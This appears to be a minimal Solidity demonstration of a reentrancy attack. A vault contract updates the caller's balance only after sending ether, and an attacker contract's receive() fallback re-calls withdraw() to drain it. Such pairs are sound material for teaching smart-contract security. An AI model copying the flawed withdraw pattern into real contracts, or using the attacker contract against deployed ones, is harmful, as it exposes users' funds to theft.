// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;


contract SomeContract {

    address[] public me;
    mapping(address => uint256) public balance;

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 myBalance = balance[msg.sender];
       
        (bool success,) = msg.sender.call{value: myBalance}("");

        if (!success) {
            revert();
        }

        balance[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}


contract AttackerContract {
    SomeContract victim;

    constructor(SomeContract theVictim){
        victim = theVictim;
    }

    function depositToVictim() public payable {
        victim.deposit{value: msg.value}();
    }

    function exploitWithdraw() public {
        victim.withdraw();
    }


    receive() external payable{
        if(address(victim).balance >= 1 ether){
            victim.withdraw();
        }
    }
}